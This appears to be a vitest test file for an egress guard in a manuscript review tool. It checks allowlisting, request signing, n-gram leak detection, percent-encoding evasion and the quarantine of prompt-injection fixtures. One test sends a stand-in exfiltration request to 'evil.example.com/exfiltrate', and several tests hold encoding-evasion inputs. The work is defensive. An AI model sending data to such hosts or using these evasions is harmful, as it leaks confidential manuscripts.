import { randomBytes } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it, vi } from 'vitest';
import type { FetchLike, HttpResponse } from '../../citations/types';
import { sanitizeManuscript } from '../../sanitize';
import { screenText } from '../../sanitize/patterns';
import { buildNgramIndex } from '../ngram';
import {
  canonicalQuery,
  createEgressController,
  type EgressLogEntry,
  isPublishedReference,
  signQuery,
  verifyQuery,
} from '../egress';

const fixturesDir = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..', 'sanitize', '__tests__', 'fixtures');
const cleanFixture = readFileSync(resolve(fixturesDir, 'clean.txt'), 'utf8');
const tier2Fixture = readFileSync(resolve(fixturesDir, 'tier2-injection.txt'), 'utf8');
const tier3Fixture = readFileSync(resolve(fixturesDir, 'tier3-injection.txt'), 'utf8');

const MANUSCRIPT_BODY =
  'The strengths intervention improved employee wellbeing over twelve weeks in a randomised field setting analysed with mixed effects models.';

const CROSSREF = 'https://api.crossref.org/works';
const PUBLISHED_REFERENCE_URL = `${CROSSREF}?query.bibliographic=${encodeURIComponent(
  'Positive Psychology Progress Empirical Validation of Interventions',
)}&rows=5`;

function okResponse(): HttpResponse {
  return { ok: true, status: 200, json: async () => ({}) };
}

function harness(): { fetch: FetchLike; calls: string[]; logs: EgressLogEntry[]; key: Buffer } {
  const calls: string[] = [];
  const logs: EgressLogEntry[] = [];
  const key = randomBytes(32);
  const base: FetchLike = async (url) => {
    calls.push(url);
    return okResponse();
  };
  const controller = createEgressController(base);
  controller.begin({
    reviewId: 'rev-egress',
    signingKey: key,
    corpus: buildNgramIndex(MANUSCRIPT_BODY, 8),
    log: (entry) => logs.push(entry),
  });
  return { fetch: controller.fetch, calls, logs, key };
}

describe('egress guard suite (SEC-07..SEC-12, SEC-30)', () => {
  it('lets a query built from a published reference reach the network, signed and logged', async () => {
    const { fetch, calls, logs } = harness();
    const response = await fetch(PUBLISHED_REFERENCE_URL);
    expect(response.ok).toBe(true);
    expect(calls).toEqual([PUBLISHED_REFERENCE_URL]);
    expect(logs).toHaveLength(1);
    expect(logs[0]).toMatchObject({ target: 'crossref', blocked: false, reason: null });
    expect(logs[0]?.signature).toMatch(/^[0-9a-f]{64}$/);
    expect(logs[0]?.query).toBe(canonicalQuery(PUBLISHED_REFERENCE_URL));
  });

  it('blocks a query that carries manuscript body text via the n-gram check, before any network call', async () => {
    const { fetch, calls, logs } = harness();
    const leaking = `${CROSSREF}?query.bibliographic=${encodeURIComponent(
      'the strengths intervention improved employee wellbeing over twelve weeks',
    )}`;
    await expect(fetch(leaking)).rejects.toThrow(/protected manuscript corpus/);
    expect(calls).toHaveLength(0);
    expect(logs).toHaveLength(1);
    expect(logs[0]).toMatchObject({ blocked: true, reason: 'ngram', target: 'crossref' });
  });

  it('rejects an unsigned or wrongly signed query at the egress client', async () => {
    const { calls, logs, key } = harness();
    const base: FetchLike = async (url) => {
      calls.push(url);
      return okResponse();
    };
    const controller = createEgressController(base);
    controller.begin({
      reviewId: 'rev-egress',
      signingKey: key,
      corpus: buildNgramIndex(MANUSCRIPT_BODY, 8),
      log: (entry) => logs.push(entry),
    });
    await expect(controller.sendSigned(PUBLISHED_REFERENCE_URL, 'not-a-valid-signature')).rejects.toThrow(
      /signature is missing or invalid/,
    );
    await expect(controller.sendSigned(PUBLISHED_REFERENCE_URL, '0'.repeat(64))).rejects.toThrow(
      /signature is missing or invalid/,
    );
    expect(calls).toHaveLength(0);
    expect(logs.every((entry) => entry.blocked && entry.reason === 'unsigned')).toBe(true);
  });

  it('blocks and logs an attempt to reach a non-allowlisted host', async () => {
    const { fetch, calls, logs } = harness();
    await expect(fetch('https://evil.example.com/exfiltrate')).rejects.toThrow(/not on the allowlist/);
    expect(calls).toHaveLength(0);
    expect(logs).toHaveLength(1);
    expect(logs[0]).toMatchObject({ blocked: true, target: null });
    expect(logs[0]?.reason).toContain('host_not_allowlisted');
  });

  it('excludes references marked in preparation, unpublished, submitted, or without a stable identifier', () => {
    expect(isPublishedReference({ raw: 'Smith, J. (in preparation). A working title.', title: 'A working title' })).toBe(
      false,
    );
    expect(isPublishedReference({ raw: 'Jones, K. Unpublished manuscript.', title: 'Draft', year: 2024 })).toBe(false);
    expect(isPublishedReference({ raw: 'Lee, R. (personal communication, 2025).', title: 'Note' })).toBe(false);
    expect(isPublishedReference({ raw: 'Author (submitted for publication).', title: 'X', year: 2025 })).toBe(false);
    expect(isPublishedReference({ raw: 'No identifier here.', title: 'Untitled' })).toBe(false);
    expect(
      isPublishedReference({
        raw: 'Van Zyl, L. (2025). Strengths coaching and flourishing at work.',
        title: 'Strengths coaching and flourishing at work',
        year: 2025,
        doi: null,
        venue: null,
      }),
    ).toBe(false);
    expect(
      isPublishedReference({ raw: 'Seligman (2005). Positive psychology progress.', doi: '10.1037/0003-066x.60.5.410' }),
    ).toBe(true);
    expect(
      isPublishedReference({
        raw: 'Diener, E. (1984). Subjective well-being. Psychological Bulletin, 95(3).',
        title: 'Subjective well-being',
        year: 1984,
        venue: 'Psychological Bulletin',
      }),
    ).toBe(true);
    expect(
      isPublishedReference({
        raw: 'Kahneman, D. (2011). Thinking, fast and slow. ISBN 978-0-374-27563-1.',
        title: 'Thinking, fast and slow',
      }),
    ).toBe(true);
  });

  it('fails closed on malformed percent-encoding instead of scanning the raw string', async () => {
    const { fetch, calls, logs } = harness();
    const evasion = `${CROSSREF}?query.bibliographic=the%20strengths%20intervention%20improved%20employee%20wellbeing%20over%20twelve%20weeks%zz`;
    await expect(fetch(evasion)).rejects.toThrow(/percent-encoding is malformed/);
    expect(calls).toHaveLength(0);
    expect(logs).toHaveLength(1);
    expect(logs[0]).toMatchObject({ blocked: true, reason: 'undecodable', target: 'crossref' });
  });

  it('catches double percent-encoded manuscript text by decoding to a fixpoint', async () => {
    const { fetch, calls, logs } = harness();
    const once = encodeURIComponent('the strengths intervention improved employee wellbeing over twelve weeks');
    const twice = encodeURIComponent(once);
    await expect(fetch(`${CROSSREF}?query.bibliographic=${twice}`)).rejects.toThrow(/protected manuscript corpus/);
    expect(calls).toHaveLength(0);
    expect(logs[0]).toMatchObject({ blocked: true, reason: 'ngram' });
  });

  it('lets a reference title containing a literal percent sign reach the network', async () => {
    const { fetch, calls, logs } = harness();
    const url = `${CROSSREF}?query.bibliographic=${encodeURIComponent('A 50% improvement in reported wellbeing outcomes')}`;
    const response = await fetch(url);
    expect(response.ok).toBe(true);
    expect(calls).toEqual([url]);
    expect(logs[0]).toMatchObject({ blocked: false, reason: null });
  });

  it('blocks a query still percent-encoded after the decode-pass cap', async () => {
    const { fetch, calls, logs } = harness();
    let deep = 'the strengths intervention improved employee wellbeing over twelve weeks';
    for (let i = 0; i < 5; i += 1) {
      deep = encodeURIComponent(deep);
    }
    await expect(fetch(`${CROSSREF}?query.bibliographic=${deep}`)).rejects.toThrow(/percent-encoding is malformed/);
    expect(calls).toHaveLength(0);
    expect(logs[0]).toMatchObject({ blocked: true, reason: 'undecodable' });
  });

  it('refuses all egress when no run context is active (fail closed)', async () => {
    const controller = createEgressController(async () => okResponse());
    expect(controller.active()).toBe(false);
    await expect(controller.fetch(PUBLISHED_REFERENCE_URL)).rejects.toThrow(/no active run context/);
  });

  it('signs and verifies queries and rejects tampering', () => {
    const key = randomBytes(32);
    const query = canonicalQuery(PUBLISHED_REFERENCE_URL);
    const signature = signQuery(query, key);
    expect(verifyQuery(query, signature, key)).toBe(true);
    expect(verifyQuery(`${query}&tampered=1`, signature, key)).toBe(false);
    expect(verifyQuery(query, signature, randomBytes(32))).toBe(false);
  });
});

describe('injection fixtures quarantine at each tier within the release gate (SEC-01..SEC-06)', () => {
  const neutralDetect = vi.fn(async () => ({ tier: 0 as const, spans: [], rationale: 'clean' }));

  it('keeps the clean fixture at tier 0', async () => {
    expect(screenText(cleanFixture)).toHaveLength(0);
    const result = await sanitizeManuscript({
      text: cleanFixture,
      runDispatch: async () => {
        throw new Error('unused');
      },
      reviewId: 'rev-clean',
      detect: neutralDetect,
    });
    expect(result.tier).toBe(0);
    expect(result.halted).toBe(false);
  });

  it('raises the hidden-instruction fixture to tier 2', async () => {
    const result = await sanitizeManuscript({
      text: tier2Fixture,
      runDispatch: async () => {
        throw new Error('unused');
      },
      reviewId: 'rev-tier2',
      detect: neutralDetect,
    });
    expect(result.tier).toBe(2);
    expect(result.status).toBe('quarantined');
    expect(result.halted).toBe(false);
  });

  it('raises the model-directed injection fixture to tier 3 and halts', async () => {
    const result = await sanitizeManuscript({
      text: tier3Fixture,
      runDispatch: async () => {
        throw new Error('unused');
      },
      reviewId: 'rev-tier3',
      detect: neutralDetect,
    });
    expect(result.tier).toBe(3);
    expect(result.status).toBe('halted');
    expect(result.halted).toBe(true);
  });
});
